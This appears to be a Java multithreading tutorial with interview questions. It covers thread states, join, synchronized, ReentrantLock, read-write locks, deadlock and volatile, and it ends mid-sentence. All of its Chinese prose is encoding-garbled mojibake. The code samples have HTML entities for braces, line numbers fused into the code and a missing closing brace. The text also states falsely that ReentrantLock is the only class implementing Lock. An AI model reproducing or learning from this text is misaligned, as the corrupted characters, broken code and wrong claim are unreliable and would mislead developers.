åŒæ­¥é˜»å¡ï¼šè¿è¡Œçš„çº¿ç¨‹åœ¨è·å–å¯¹è±¡çš„åŒæ­¥é”æ—¶ï¼Œè‹¥è¯¥åŒæ­¥é”è¢«åˆ«çš„çº¿ç¨‹å ç”¨ï¼Œåˆ™ JVM ä¼šæŠŠè¯¥çº¿ç¨‹æ”¾å…¥é”æ± ä¸­ã€‚ å…¶ä»–é˜»å¡ï¼šè¿è¡Œçš„çº¿ç¨‹æ‰§è¡Œ sleep()æˆ– join()æ–¹æ³•ï¼Œæˆ–è€…å‘å‡ºäº† I/O è¯·æ±‚æ—¶ï¼ŒJVM ä¼šæŠŠ è¯¥çº¿ç¨‹ç½®ä¸ºé˜»å¡çŠ¶æ€ã€‚å½“ sleep()çŠ¶æ€è¶…æ—¶ã€join()ç­‰å¾…çº¿ç¨‹ç»ˆæ­¢æˆ–è€…è¶…æ—¶ã€æˆ–è€… I/O å¤„ç†å®Œæ¯• æ—¶ï¼Œçº¿ç¨‹é‡æ–°è½¬å…¥å°±ç»ªçŠ¶æ€ã€‚ï¼ˆæ³¨æ„ï¼šsleep æ˜¯ä¸ä¼šé‡Šæ”¾æŒæœ‰çš„é”ï¼‰ æ­»äº¡çŠ¶æ€ï¼ˆDeadï¼‰ï¼šçº¿ç¨‹æ‰§è¡Œå®Œäº†æˆ–è€…å› å¼‚å¸¸é€€å‡ºäº† run()æ–¹æ³•ï¼Œè¯¥çº¿ç¨‹ç»“æŸç”Ÿå‘½å‘¨æœŸã€‚ 1.4 å‡ ä¸ªé‡è¦çš„æ–¹æ³•çš„åŒºåˆ«ï¼š sleep(timeout)ï¼šå½“å‰çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œæš‚åœæ‰§è¡Œä¸€å®šæ—¶é—´ï¼Œä¸ä¼šé‡Šæ”¾é”æ ‡è®° join()ï¼šjoin()æ–¹æ³•ä¼šä½¿å½“å‰çº¿ç¨‹ç­‰å¾…è°ƒç”¨ join()æ–¹æ³•çš„çº¿ç¨‹ç»“æŸåæ‰èƒ½ç»§ç»­æ‰§è¡Œ yield()ï¼šè°ƒç”¨è¯¥æ–¹æ³•çš„çº¿ç¨‹é‡å›å¯æ‰§è¡ŒçŠ¶æ€ï¼Œä¸ä¼šé‡Šæ”¾é”æ ‡è®°ï¼Œå¯ä»¥ç†è§£ä¸ºäº¤å‡º CPU æ—¶é—´ç‰‡ï¼Œ ä½†æ˜¯ä¸ä¸€å®šæœ‰æ•ˆæœï¼Œå› ä¸ºæœ‰å¯èƒ½åˆè¢«é©¬ä¸Šæ‰§è¡Œã€‚è¯¥æ–¹æ³•çš„çœŸæ­£ä½œç”¨æ˜¯ä½¿å…·æœ‰ç›¸åŒæˆ–è€…æ›´é«˜ä¼˜ å…ˆçº§çš„æ–¹æ³•å¾—åˆ°æ‰§è¡Œæœºä¼šã€‚ wait(timeout)ï¼šwait æ–¹æ³•é€šå¸¸å’Œ notify()/notifyAll()æ­é…ä½¿ç”¨ï¼Œå½“å‰çº¿ç¨‹æš‚åœæ‰§è¡Œï¼Œä¼šé‡Šæ”¾é” æ ‡è®°ã€‚è¿›å…¥å¯¹è±¡ç­‰å¾…æ± ã€‚ç›´åˆ°è°ƒç”¨ notify()æ–¹æ³•ä¹‹åï¼Œçº¿ç¨‹è¢«ç§»åŠ¨åˆ°é”æ ‡è®°ç­‰å¾…æ± ã€‚åªæœ‰é” æ ‡è®°ç­‰å¾…æ± çš„çº¿ç¨‹æ‰èƒ½è·å¾—é” 1.5 Joinçš„ç”¨æ³•è”åˆçº¿ç¨‹: çº¿ç¨‹çš„joinæ–¹æ³•è¡¨ç¤ºä¸€ä¸ªçº¿ç¨‹ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹å®Œæˆåæ‰æ‰§è¡Œã€‚æœ‰äººä¹ŸæŠŠè¿™ç§æ–¹å¼ç§°ä¸ºè”åˆçº¿ç¨‹ï¼Œå°±æ˜¯è¯´æŠŠå½“å‰çº¿ç¨‹å’Œå½“å‰çº¿ç¨‹æ‰€åœ¨çš„çº¿ç¨‹è”åˆæˆä¸€ä¸ªçº¿ç¨‹ã€‚joinæ–¹æ³•è¢«è°ƒç”¨ä¹‹åï¼Œçº¿ç¨‹å¯¹è±¡å¤„äºé˜»å¡çŠ¶æ€ã€‚ é€‚ç”¨äºAçº¿ç¨‹éœ€è¦ç­‰åˆ°Bçº¿ç¨‹æ‰§è¡Œå®Œæ¯•,å†æ‹¿Bçº¿ç¨‹çš„ç»“æœå†ç»§ç»­è¿è¡ŒAçº¿ç¨‹. è¯´äººè¯: Açº¿ç¨‹éœ€è¦æ‹¿åˆ°Bçº¿ç¨‹çš„æ‰§è¡Œç»“æœ,æ‰èƒ½ç»§ç»­å¾€ä¸‹. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081class Join extends Thread&#123; @Override public void run() &#123; for (int i = 0; i &lt; 50; i++) &#123; System.out.println("This is join: " + i); &#125; &#125;public class JoinThread &#123; public static void main(String[] args) throws InterruptedException &#123; System.out.println("begin..."); Join joinThread = new Join();//åˆ›å»ºjoinçº¿ç¨‹å¯¹è±¡ for (int i = 0; i &lt; 50; i++) &#123; System.out.println("main: " +i); if (i == 10)&#123; //å¯åŠ¨joinå¯¹è±¡ joinThread.start(); &#125; if (i == 20)&#123; System.out .println("------------------------------------------"); joinThread.join();//åœ¨æ­¤å¤„å¼ºåˆ¶è¿è¡Œè¯¥çº¿ç¨‹ &#125; &#125; &#125;&#125; ===================æ‰§è¡Œç»“æœ===================begin...main: 0main: 1main: 2main: 3main: 4main: 5main: 6main: 7main: 8main: 9main: 10main: 11main: 12main: 13This is join: 0main: 14This is join: 1This is join: 2This is join: 3main: 15This is join: 4main: 16main: 17main: 18main: 19main: 20------------------------------------------This is join: 5This is join: 6This is join: 7This is join: 8This is join: 9This is join: 10......This is join: 44This is join: 45This is join: 46This is join: 47This is join: 48This is join: 49main: 21main: 22main: 23main: 24main: 25main: 26main: 27main: 28main: 29main: 30 2. JavaåŒæ­¥å…³é”®è¯è§£é‡Š2.1. synchronizedå±äº JVM çº§åˆ«åŠ é”ï¼Œåº•å±‚å®ç°æ˜¯ï¼š åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œåœ¨æŒ‡ä»¤çº§åˆ«åŠ å…¥ä¸€äº›æ ‡è¯†æ¥å®ç°çš„ã€‚ 1. é”å¯¹è±¡æ³¨æ„ç‚¹: å¿…é¡»æ˜¯é”çš„åŒä¸€ä¸ªå¯¹è±¡ 2. é”è·å–å’Œé‡Šæ”¾ é”çš„è·å–æ˜¯ç”±JVMå†³å®šçš„, ç”¨æˆ·æ— æ³•æ“ä½œ é”çš„é‡Šæ”¾ä¹Ÿæ˜¯ç”±JVMå†³å®šçš„ Synchronized æ— æ³•ä¸­æ–­æ­£åœ¨é˜»å¡é˜Ÿåˆ—æˆ–è€…ç­‰å¾…é˜Ÿåˆ—çš„çº¿ç¨‹ã€‚ 3. ä»€ä¹ˆæ—¶å€™ä¼šé‡Šæ”¾ è·å–é”çš„çº¿ç¨‹æ‰§è¡Œå®Œäº†è¯¥ä»£ç å—ï¼Œç„¶åçº¿ç¨‹é‡Šæ”¾å¯¹é”çš„å æœ‰ï¼› çº¿ç¨‹æ‰§è¡Œå‘ç”Ÿå¼‚å¸¸ï¼Œæ­¤æ—¶ JVM ä¼šè®©çº¿ç¨‹è‡ªåŠ¨é‡Šæ”¾é”ã€‚ 4.æ ¼å¼ 1234// åŠ åŒæ­¥æ ¼å¼ï¼šsynchronized(éœ€è¦ä¸€ä¸ªä»»æ„çš„å¯¹è±¡ï¼ˆé”ï¼‰)&#123; ä»£ç å—ä¸­æ”¾æ“ä½œå…±äº«æ•°æ®çš„ä»£ç ã€‚&#125; 5.çº¿ç¨‹æ‰§è¡Œäº’æ–¥ä»£ç çš„è¿‡ç¨‹ è·å¾—äº’æ–¥é” æ¸…ç©ºå·¥ä½œå†…å­˜ ä»ä¸»å†…å­˜æ‹·è´å˜é‡çš„æœ€æ–°å‰¯æœ¬åˆ°å·¥ä½œå†…å­˜ æ‰§è¡Œä»£ç  å°†æ›´æ–°åçš„å…±äº«å˜é‡çš„å€¼åˆ·æ–°åˆ°ä¸»å†…å­˜ é‡Šæ”¾äº’æ–¥é” Lock -&gt; ä¸»å†…å­˜ -&gt; å·¥ä½œå†…å­˜ -&gt; ä¸»å†…å­˜ -&gt; unlock 2.2 Lockæ‰‹åŠ¨è·å–æˆ–é‡Šæ”¾é”, æä¾›äº†æ¯” synchronized æ›´å¤šçš„åŠŸèƒ½ Lock é”æ˜¯ Java ä»£ç çº§åˆ«æ¥å®ç°çš„ï¼Œç›¸å¯¹äº synchronized åœ¨åŠŸèƒ½æ€§ä¸Šï¼Œæœ‰æ‰€åŠ å¼ºï¼Œä¸»è¦æ˜¯ï¼Œå…¬å¹³é”ï¼Œè½® è¯¢é”ï¼Œå®šæ—¶é”ï¼Œå¯ä¸­æ–­é”ç­‰ï¼Œè¿˜å¢åŠ äº†å¤šè·¯é€šçŸ¥æœºåˆ¶ï¼ˆConditionï¼‰ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªé”æ¥ç®¡ç†å¤š ä¸ªåŒæ­¥å—ã€‚å¦å¤–åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œå¿…é¡»æ‰‹åŠ¨çš„é‡Šæ”¾é”ã€‚Lock é”çš„å®ç°ï¼Œä¸»è¦æ˜¯å€ŸåŠ©äºé˜Ÿåˆ—åŒ æ­¥å™¨ï¼ˆæˆ‘ä»¬å¸¸å¸¸è§åˆ°çš„ AQSï¼‰æ¥å®ç°ã€‚å®ƒåŒ…æ‹¬ä¸€ä¸ª int å˜é‡æ¥è¡¨ç¤ºçŠ¶æ€ï¼›ä¸€ä¸ª FIFO é˜Ÿåˆ—ï¼Œæ¥ å­˜å‚¨è·å–èµ„æºçš„æ’é˜Ÿçº¿ç¨‹ã€‚ åŸºæœ¬ä½¿ç”¨ 12345678910111213class X &#123; // åˆ›å»ºä¸€æŠŠé” private final ReentrantLock lock = new ReentrantLock(); // éœ€è¦åšåŒæ­¥çš„æ–¹æ³• public void m() &#123; lock.lock(); //è·å–ğŸ”, åŠ é” try &#123; // ä»£ç  &#125; finally &#123; lock.unlock(); // é‡Šæ”¾ğŸ” &#125; &#125;&#125; 1. lock å’Œ synchronized çš„åŒºåˆ« Lock ä¸æ˜¯ Java è¯­è¨€å†…ç½®çš„ï¼Œsynchronized æ˜¯ Java è¯­è¨€çš„å…³é”®å­—ï¼Œå› æ­¤æ˜¯å†…ç½®ç‰¹æ€§ã€‚Lock æ˜¯ä¸€ä¸ªç±»ï¼Œé€šè¿‡è¿™ä¸ªç±»å¯ä»¥å®ç°åŒæ­¥è®¿é—®ï¼› Lock å’Œ synchronized æœ‰ä¸€ç‚¹éå¸¸å¤§çš„ä¸åŒï¼Œé‡‡ç”¨ synchronized ä¸éœ€è¦ç”¨æˆ·å»æ‰‹åŠ¨é‡Šæ”¾é”ï¼Œ å½“ synchronized æ–¹æ³•æˆ–è€… synchronized ä»£ç å—æ‰§è¡Œå®Œä¹‹åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è®©çº¿ç¨‹é‡Šæ”¾å¯¹é”çš„å  ç”¨ï¼›è€Œ Lock åˆ™å¿…é¡»è¦ç”¨æˆ·å»æ‰‹åŠ¨é‡Šæ”¾é”ï¼Œå¦‚æœæ²¡æœ‰ä¸»åŠ¨é‡Šæ”¾é”ï¼Œå°±æœ‰å¯èƒ½å¯¼è‡´å‡ºç°æ­»é”ç° è±¡ã€‚ 2. Lock æ¥å£ä¸­æ–¹æ³•çš„ä½¿ç”¨ ReentrantLock ç±» ReentrantLock æ˜¯å”¯ä¸€å®ç°äº† Lock æ¥å£çš„ç±»ï¼Œå¹¶ä¸” ReentrantLock æä¾›äº†æ›´å¤šçš„æ–¹æ³•ï¼ŒReentrantLockï¼Œæ„æ€æ˜¯â€œå¯é‡å…¥é”â€ã€‚ lock()ã€tryLock()ã€tryLock(long time, TimeUnit unit)ã€lockInterruptibly()æ˜¯ç”¨æ¥è·å–é”çš„ã€‚ unLock()æ–¹æ³•æ˜¯ç”¨æ¥é‡Šæ”¾é”çš„ã€‚ å››ä¸ªè·å–é”æ–¹æ³•çš„åŒºåˆ« lock()ï¼Œé˜»å¡æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯å¹³å¸¸ä½¿ç”¨å¾—æœ€å¤šçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå°±æ˜¯ç”¨æ¥è·å–é”ã€‚å¦‚æœé”å·²è¢« å…¶ä»–çº¿ç¨‹è·å–ï¼Œåˆ™è¿›è¡Œç­‰å¾…ã€‚ç”±äºåœ¨å‰é¢è®²åˆ°å¦‚æœé‡‡ç”¨ Lockï¼Œå¿…é¡»ä¸»åŠ¨å»é‡Šæ”¾é”ï¼Œå¹¶ä¸”åœ¨ å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨é‡Šæ”¾é”ã€‚å› æ­¤ä¸€èˆ¬æ¥è¯´ï¼Œä½¿ç”¨ Lock å¿…é¡»åœ¨ try{}catch{}å—ä¸­è¿›è¡Œï¼Œå¹¶ ä¸”å°†é‡Šæ”¾é”çš„æ“ä½œæ”¾åœ¨ finally å—ä¸­è¿›è¡Œï¼Œä»¥ä¿è¯é”ä¸€å®šè¢«è¢«é‡Šæ”¾ï¼Œé˜²æ­¢æ­»é”çš„å‘ç”Ÿã€‚ tryLock()ï¼Œéé˜»å¡æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯æœ‰è¿”å›å€¼çš„ï¼Œå®ƒè¡¨ç¤ºç”¨æ¥å°è¯•è·å–é”ï¼Œå¦‚æœè·å–æˆåŠŸï¼Œ åˆ™è¿”å› trueï¼Œå¦‚æœè·å–å¤±è´¥ï¼ˆå³é”å·²è¢«å…¶ä»–çº¿ç¨‹è·å–ï¼‰ï¼Œåˆ™è¿”å› falseï¼Œä¹Ÿå°±è¯´è¿™ä¸ªæ–¹æ³•æ— è®º å¦‚ä½•éƒ½ä¼šç«‹å³è¿”å›ã€‚åœ¨æ‹¿ä¸åˆ°é”æ—¶ä¸ä¼šä¸€ç›´åœ¨é‚£ç­‰å¾…ã€‚ tryLock(long time, TimeUnit unit)ï¼Œé˜»å¡æ–¹æ³•ï¼Œé˜»å¡ç»™å®šæ—¶é•¿ï¼Œè¯¥æ–¹æ³•å’Œ tryLock()æ–¹æ³•æ˜¯ ç±»ä¼¼çš„ï¼Œåªä¸è¿‡åŒºåˆ«åœ¨äºè¿™ä¸ªæ–¹æ³•åœ¨æ‹¿ä¸åˆ°é”æ—¶ä¼šç­‰å¾…ä¸€å®šçš„æ—¶é—´ï¼Œåœ¨æ—¶é—´æœŸé™ä¹‹å†…å¦‚æœè¿˜ æ‹¿ä¸åˆ°é”ï¼Œå°±è¿”å› falseã€‚å¦‚æœä¸€å¼€å§‹æ‹¿åˆ°é”æˆ–è€…åœ¨ç­‰å¾…æœŸé—´å†…æ‹¿åˆ°äº†é”ï¼Œåˆ™è¿”å› trueã€‚ lockInterruptibly()è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒç‰¹æ®Šï¼Œå½“é€šè¿‡è¿™ä¸ªæ–¹æ³•å»è·å–é”æ—¶ï¼Œå¦‚æœçº¿ç¨‹æ­£åœ¨ç­‰å¾… è·å–é”ï¼Œåˆ™è¿™ä¸ªçº¿ç¨‹èƒ½å¤Ÿå“åº”ä¸­æ–­ï¼Œå³ä¸­æ–­çº¿ç¨‹çš„ç­‰å¾…çŠ¶æ€ã€‚ä¹Ÿå°±ä½¿è¯´ï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶é€š è¿‡ lock.lockInterruptibly()æƒ³è·å–æŸä¸ªé”æ—¶ï¼Œå‡è‹¥æ­¤æ—¶çº¿ç¨‹ A è·å–åˆ°äº†é”ï¼Œè€Œçº¿ç¨‹ B åªæœ‰åœ¨ç­‰ å¾…ï¼Œé‚£ä¹ˆå¯¹çº¿ç¨‹ B è°ƒç”¨ threadB.interrupt()æ–¹æ³•èƒ½å¤Ÿä¸­æ–­çº¿ç¨‹ B çš„ç­‰å¾…è¿‡ç¨‹ã€‚ 2.3 Lock ä¸ synchronized çš„é€‰æ‹© Lock æ˜¯ä¸€ä¸ªæ¥å£ï¼Œè€Œ synchronized æ˜¯ Java ä¸­çš„å…³é”®å­—ï¼Œsynchronized æ˜¯å†…ç½®çš„è¯­è¨€å®ç°ï¼› synchronized åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œä¼šè‡ªåŠ¨é‡Šæ”¾çº¿ç¨‹å æœ‰çš„é”ï¼Œå› æ­¤ä¸ä¼šå¯¼è‡´æ­»é”ç°è±¡å‘ç”Ÿï¼› è€Œ Lock åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä¸»åŠ¨é€šè¿‡ unLock()å»é‡Šæ”¾é”ï¼Œåˆ™å¾ˆå¯èƒ½é€ æˆæ­»é”ç°è±¡ï¼Œå›  æ­¤ä½¿ç”¨ Lock æ—¶éœ€è¦åœ¨ finally å—ä¸­é‡Šæ”¾é”ï¼› Lock å¯ä»¥è®©ç­‰å¾…é”çš„çº¿ç¨‹å“åº”ä¸­æ–­ï¼Œè€Œ synchronized å´ä¸è¡Œï¼Œä½¿ç”¨ synchronized æ—¶ï¼Œç­‰ å¾…çš„çº¿ç¨‹ä¼šä¸€ç›´ç­‰å¾…ä¸‹å»ï¼Œä¸èƒ½å¤Ÿå“åº”ä¸­æ–­ï¼› é€šè¿‡ Lock å¯ä»¥çŸ¥é“æœ‰æ²¡æœ‰æˆåŠŸè·å–é”ï¼Œè€Œ synchronized å´æ— æ³•åŠåˆ°ã€‚ Lock å¯ä»¥æé«˜å¤šä¸ªçº¿ç¨‹è¿›è¡Œè¯»æ“ä½œçš„æ•ˆç‡ã€‚ 2.4 è¯»å†™é” çº¿ç¨‹è¿›å…¥è¯»é”çš„å‰ææ¡ä»¶ï¼š æ²¡æœ‰å…¶ä»–çº¿ç¨‹çš„å†™é”, æ²¡æœ‰å†™è¯·æ±‚æˆ–è€…æœ‰å†™è¯·æ±‚ï¼Œä½†è°ƒç”¨çº¿ç¨‹å’ŒæŒæœ‰é”çš„çº¿ç¨‹æ˜¯åŒä¸€ä¸ª çº¿ç¨‹è¿›å…¥å†™é”çš„å‰ææ¡ä»¶ï¼š æ²¡æœ‰å…¶ä»–çº¿ç¨‹çš„è¯»é”, æ²¡æœ‰å…¶ä»–çº¿ç¨‹çš„å†™é” ReentrantReadWriteLock ä¸ ReentrantLock éƒ½æ˜¯å•ç‹¬çš„å®ç°ï¼Œå½¼æ­¤ä¹‹é—´æ²¡æœ‰ç»§æ‰¿æˆ–å®ç°çš„å…³ç³»ã€‚ ReadWriteLock ç±»123456// API// å¯ä»¥åŒºåˆ«å¯¹å¾…è¯»ã€å†™çš„æ“ä½œpublic interface ReadWriteLock &#123; Lock readLock(); Lock writeLock();&#125; ReentrantReadWriteLock ç±» ReentrantReadWriteLock é‡Œé¢æä¾›äº†å¾ˆå¤šä¸°å¯Œçš„æ–¹æ³•ï¼Œä¸è¿‡æœ€ä¸»è¦çš„æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼šreadLock()å’Œ writeLock()ç”¨æ¥è·å–è¯»é”å’Œå†™é”ã€‚ æ³¨æ„ï¼šä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæœ‰ä¸€ä¸ªçº¿ç¨‹å·²ç»å ç”¨äº†è¯»é”ï¼Œåˆ™æ­¤æ—¶å…¶ä»–çº¿ç¨‹å¦‚æœè¦ç”³è¯·å†™ é”ï¼Œåˆ™ç”³è¯·å†™é”çš„çº¿ç¨‹ä¼šä¸€ç›´ç­‰å¾…é‡Šæ”¾è¯»é”ã€‚ å¦‚æœæœ‰ä¸€ä¸ªçº¿ç¨‹å·²ç»å ç”¨äº†å†™é”ï¼Œåˆ™æ­¤æ—¶å…¶ä»–çº¿ç¨‹å¦‚æœç”³è¯·å†™é”æˆ–è€…è¯»é”ï¼Œåˆ™ç”³è¯·çš„çº¿ç¨‹ ä¼šä¸€ç›´ç­‰å¾…é‡Šæ”¾å†™é”ã€‚ 2.5 æ­»é”æ­»é”æ˜¯æŒ‡ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå› äº‰å¤ºèµ„æºè€Œé€ æˆçš„ä¸€ç§äº’ç›¸ç­‰å¾…çš„ç°è±¡ï¼Œ è‹¥æ— å¤–åŠ›ä½œç”¨ï¼Œå®ƒä»¬éƒ½å°†æ— æ³•æ¨è¿›ä¸‹å»ã€‚è¿™æ˜¯ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼Œå› ä¸ºæ­»é”ä¼šè®©ä½ çš„ç¨‹åºæŒ‚èµ· æ— æ³•å®Œæˆä»»åŠ¡ã€‚ æ­»é”çš„å‘ç”Ÿå¿…é¡»æ»¡è¶³ä»¥ä¸‹å››ä¸ªæ¡ä»¶ï¼š äº’æ–¥æ¡ä»¶ï¼šä¸€ä¸ªèµ„æºæ¯æ¬¡åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ã€‚ è¯·æ±‚ä¸ä¿æŒæ¡ä»¶ï¼šä¸€ä¸ªè¿›ç¨‹å› è¯·æ±‚èµ„æºè€Œé˜»å¡æ—¶ï¼Œå¯¹å·²è·å¾—çš„èµ„æºä¿æŒä¸æ”¾ã€‚ ä¸å‰¥å¤ºæ¡ä»¶ï¼šè¿›ç¨‹å·²è·å¾—çš„èµ„æºï¼Œåœ¨æœ«ä½¿ç”¨å®Œä¹‹å‰ï¼Œä¸èƒ½å¼ºè¡Œå‰¥å¤ºã€‚ å¾ªç¯ç­‰å¾…æ¡ä»¶ï¼šè‹¥å¹²è¿›ç¨‹ä¹‹é—´å½¢æˆä¸€ç§å¤´å°¾ç›¸æ¥çš„å¾ªç¯ç­‰å¾…èµ„æºå…³ç³»ã€‚ é¿å…æ­»é”æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯é˜»æ­¢å¾ªç¯ç­‰å¾…æ¡ä»¶ï¼Œå°†ç³»ç»Ÿä¸­æ‰€æœ‰çš„èµ„æºè®¾ç½®æ ‡å¿—ä½ã€æ’åºï¼Œè§„ å®šæ‰€æœ‰çš„è¿›ç¨‹ç”³è¯·èµ„æºå¿…é¡»ä»¥ä¸€å®šçš„é¡ºåºï¼ˆå‡åºæˆ–é™åºï¼‰åšæ“ä½œæ¥é¿å…æ­»é” 2.6 Volatile ç‰¹æ®ŠåŸŸå˜é‡å¤šçº¿ç¨‹ç¼–ç¨‹ï¼Œæˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜é›†ä¸­åœ¨ä¸‰ä¸ªæ–¹é¢ï¼š åŸå­æ€§ã€‚æœ€ç®€å•çš„ä¾‹å­å°±æ˜¯ï¼Œi++,åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œæœ€ç»ˆçš„ç»“æœæ˜¯ä¸ç¡®å®šçš„ï¼Œä¸ºä»€ä¹ˆï¼Ÿå°± æ˜¯å› ä¸ºè¿™ä¹ˆä¸€ä¸ª++æ“ä½œï¼Œè¢«ç¼–è¯‘ä¸ºè®¡ç®—æœºåº•å±‚æŒ‡ä»¤åï¼Œæ˜¯å¤šä¸ªæŒ‡ä»¤æ¥å®Œæˆçš„ã€‚é‚£ä¹ˆé‡åˆ°å¹¶å‘ çš„æƒ…å†µï¼Œå°±ä¼šå¯¼è‡´å½¼æ­¤â€œè¦†ç›–â€çš„æƒ…å†µã€‚ å¯è§æ€§ã€‚é€šä¿—è§£é‡Šå°±æ˜¯ï¼Œåœ¨ A çº¿ç¨‹å¯¹ä¸€ä¸ªå˜é‡åšäº†ä¿®æ”¹ï¼Œåœ¨ B çº¿ç¨‹ä¸­ï¼Œèƒ½æ­£ç¡®çš„è¯»å–åˆ° ä¿®æ”¹åçš„ç»“æœã€‚ç©¶å…¶åŸç†ï¼Œæ˜¯ cpu ä¸æ˜¯ç›´æ¥å’Œç³»ç»Ÿå†…å­˜é€šä¿¡ï¼Œè€Œæ˜¯æŠŠå˜é‡è¯»å–åˆ° L1ï¼ŒL2 ç­‰ å†…éƒ¨çš„ç¼“å­˜ä¸­ï¼Œä¹Ÿå«ä½œç§æœ‰çš„æ•°æ®å·¥ä½œæ ˆã€‚ä¿®æ”¹ä¹Ÿæ˜¯åœ¨å†…éƒ¨ç¼“å­˜ä¸­ï¼Œä½†æ˜¯ä½•æ—¶åŒæ­¥åˆ°ç³»ç»Ÿå†… å­˜æ˜¯ä¸èƒ½ç¡®å®šçš„ï¼Œæœ‰äº†è¿™ä¸ªæ—¶é—´å·®ï¼Œåœ¨å¹¶å‘çš„æ—¶å€™ï¼Œå°±å¯èƒ½ä¼šå¯¼è‡´ï¼Œè¯»åˆ°çš„å€¼ï¼Œä¸æ˜¯æœ€æ–°å€¼ã€‚ æŒ‡ä»¤é‡æ’ã€‚è¿™é‡Œåªè¯´æŒ‡ä»¤é‡æ’åºï¼Œè™šæ‹Ÿæœºåœ¨æŠŠä»£ç ç¼–è¯‘ä¸ºæŒ‡ä»¤åæ‰§è¡Œï¼Œå‡ºäºä¼˜åŒ–çš„ç›®çš„ï¼Œ åœ¨ä¿è¯ç»“æœä¸å˜çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šè°ƒæ•´æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºã€‚ valotileï¼Œèƒ½æ»¡è¶³ä¸Šè¿°çš„å¯è§æ€§å’Œæœ‰åºæ€§ã€‚ä½†æ˜¯æ— æ³•ä¿è¯åŸå­æ€§ã€‚ å¯è§æ€§ï¼Œæ˜¯åœ¨ä¿®æ”¹åï¼Œå¼ºåˆ¶æŠŠå¯¹å˜é‡çš„ä¿®æ”¹åŒæ­¥åˆ°ç³»ç»Ÿå†…å­˜ã€‚è€Œå…¶ä»– cpu åœ¨è¯»å–è‡ªå·±çš„å†…éƒ¨ ç¼“å­˜ä¸­çš„å€¼çš„æ—¶å€™ï¼Œå‘ç°æ˜¯ valotile ä¿®é¥°çš„ï¼Œä¼šæŠŠå†…éƒ¨ç¼“å­˜ä¸­çš„å€¼ï¼Œç½®ä¸ºæ— æ•ˆï¼Œç„¶åä»ç³»ç»Ÿ å†…å­˜è¯»å–ã€‚ æœ‰åºæ€§ï¼Œæ˜¯é€šè¿‡å†…å­˜å±éšœæ¥å®ç°çš„ã€‚æ‰€è°“çš„å†…å­˜å±éšœï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œåœ¨æŸäº›æŒ‡ä»¤ä¸­ï¼Œæ’å…¥å± éšœæŒ‡ä»¤ï¼Œç”¨ä»¥ç¡®ä¿ï¼Œåœ¨å‘å±éšœæŒ‡ä»¤åé¢ç»§ç»­æ‰§è¡Œçš„æ—¶å€™ï¼Œå…¶å‰é¢çš„æ‰€æœ‰æŒ‡ä»¤å·²ç»æ‰§è¡Œå®Œæ¯•ã€‚ 3. Javaå¤šçº¿ç¨‹ä¸­å¸¸è§çš„é¢è¯•é¢˜1. sleep(),wait(),join(),yield()å››ä¸ªæ–¹æ³•çš„åŒºåˆ«æ€»ç»“ï¼š 1ï¼‰ï¼šsleep()ï¼ŒThread ç±»ä¸­çš„æ–¹æ³•ï¼Œè¡¨ç¤ºå½“å‰çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œä¸é‡Šæ”¾é” 2ï¼‰ï¼šwait()ï¼ŒObject ç±»ä¸­çš„æ–¹æ³•ï¼Œè¡¨ç¤ºçº¿ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œé‡Šæ”¾é”ï¼Œæ‰€ä»¥ä¸€èˆ¬èƒ½è°ƒç”¨è¿™ä¸ªæ–¹ æ³•çš„éƒ½æ˜¯åŒæ­¥ä»£ç å—ï¼Œæˆ–è€…è·å–äº†é”çš„çº¿ç¨‹ä»£ç ï¼Œé€šå¸¸å’Œ notify()å’Œ notifyAll()æ–¹æ³•ç»“åˆä½¿ç”¨ 3ï¼‰ï¼šjoin()ï¼ŒThread ç±»ä¸­çš„æ–¹æ³•ï¼Œå‡å¦‚åœ¨ a çº¿ç¨‹ä¸­è°ƒç”¨ b çº¿ç¨‹å¯¹è±¡çš„ join()æ–¹æ³•ï¼Œè¡¨ç¤ºå½“å‰ a çº¿ç¨‹é˜»å¡ï¼Œç›´åˆ° b çº¿ç¨‹è¿è¡Œç»“æŸ 4ï¼‰ï¼šyield()ï¼ŒThread ç±»ä¸­çš„æ–¹æ³•ï¼Œè¡¨ç¤ºçº¿ç¨‹å›å¯æ‰§è¡ŒçŠ¶æ€ã€‚è·Ÿ sleep æ–¹æ³•ä¸€æ ·ï¼Œä¹Ÿä¸äº¤å‡ºé”ï¼Œ åªä¸è¿‡ä¸å¸¦æ—¶é—´å‚æ•°ï¼Œæ˜¯æŒ‡äº¤å‡º cpu 2. Thread å’Œ Runnable çš„åŒºåˆ«æ€»ç»“ï¼š å®ç° Runnable æ¥å£æ¯”ç»§æ‰¿ Thread ç±»æ‰€å…·æœ‰çš„ä¼˜åŠ¿ï¼š 1ï¼‰ï¼šé€‚åˆå¤šä¸ªç›¸åŒçš„ç¨‹åºä»£ç 